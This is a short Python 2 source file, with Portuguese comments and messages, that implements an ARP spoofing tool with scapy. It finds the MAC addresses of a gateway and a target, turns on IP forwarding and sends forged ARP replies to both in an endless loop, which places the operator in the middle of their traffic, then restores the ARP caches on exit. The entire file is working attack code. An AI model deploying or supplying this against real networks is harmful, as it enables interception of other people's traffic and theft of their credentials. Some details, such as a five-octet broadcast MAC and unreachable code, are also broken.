#!/usr/bin/env python2.7
#coding=UTF-8

from scapy.all import *
from utils import *
import os
import sys
import threading
import signal




class ARPspoof(object):


	def __init__(self, gateway, target):

		#arrumar essa gambi dpois mano kk

		self.gateway = gateway
		self.target = target
		gateway_mac = self.get_mac(self.gateway)
		target_mac = self.get_mac(self.target)
		self.gateway_mac = gateway_mac
		self.target_mac = target_mac

	def restore_target(self):
		print "[*] Restaurando alvo..."
		send(ARP(op=2, psrc=self.gateway, pdst=self.target, hwdst="ff:ff:ff:ff:ff", hwsrc=self.gateway_mac),count=5)
		send(ARP(op=2, psrc=self.target, pdst=self.gateway, hwdst="ff:ff:ff:ff:ff",hwsrc=self.target_mac),count=5)
		set_ip_forwarding(0)

	def get_mac(self, ip_address):
		responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2,retry=10)
	 	# Retorna o endereco MAC de uma resposta
		for s,r in responses:
			return r[Ether].src
			return None

	def spoof(self):
		iptables()
		set_ip_forwarding(1)	
		poison_target = ARP()
		poison_target.op = 2
		poison_target.psrc = self.gateway
		poison_target.pdst = self.target
		poison_target.hwdst = self.target_mac
		poison_gateway = ARP()
		poison_gateway.op = 2
		poison_gateway.psrc = self.target
		poison_gateway.pdst = self.gateway
		poison_gateway.hwdst = self.gateway_mac

		print "[*] Iniciando o evenenamento ARP. [Ctrl-C para finalizar]"

		try:
			while True:
				send(poison_target)
				send(poison_gateway)
				time.sleep(4)
		except KeyboardInterrupt:
			self.restore_target()
			print "[*] Evenenamento ARP finalizado."
			return


